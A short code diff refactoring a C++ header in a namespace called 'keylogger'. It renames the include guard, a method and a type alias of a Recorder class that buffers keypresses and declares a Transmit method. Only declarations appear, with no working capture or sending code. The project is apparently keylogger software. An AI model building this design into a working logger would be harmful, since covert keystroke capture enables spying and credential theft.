@@ -1,12 +1,10 @@
-#ifndef TRANSMITTER_H_
-#define TRANSMITTER_H_
+#ifndef RECORDER_H_
+#define RECORDER_H_
 
 #include <filesystem>
 #include <vector>
 
 namespace keylogger {
-
-using KeyList = std::vector<char>;
 
 class Recorder {
  public:
@@ -18,12 +16,14 @@ class Recorder {
   Recorder(Recorder&&) = default;
   Recorder& operator=(Recorder&&) = default;
 
-  void BufferKeypress(char key);
+  void BufferKeyPress(char character);
   virtual void Transmit() = 0;
 
  protected:
+  using CharList = std::vector<char>;
+
   int num_keys_;
-  KeyList keys_;
+  CharList keys_;
 };
 
 class FileRecorder : public Recorder {
